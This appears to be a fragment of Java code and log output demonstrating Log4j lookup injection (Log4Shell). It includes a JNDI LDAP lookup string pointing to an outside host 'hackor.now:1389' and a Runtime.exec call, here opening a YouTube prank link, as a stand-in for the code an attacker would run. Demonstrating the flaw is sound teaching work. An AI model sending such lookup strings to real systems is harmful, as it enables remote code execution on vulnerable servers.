logger.error("${java-version}");

"12:09:23.034 [main] ERROR Main - Java version 1.8.0_231"

"12:09:23.034 [main] ERROR Main - ${java-version}"

logger.error(String.format("%s", System.getenv("java-version")));

logger.error("${jndi:ldap://hackor.now:1389/123}");

Process p = Runtime.getRuntime().exec(new String[]{"open ","https://youtu.be/dQw4w9WgXcQ"});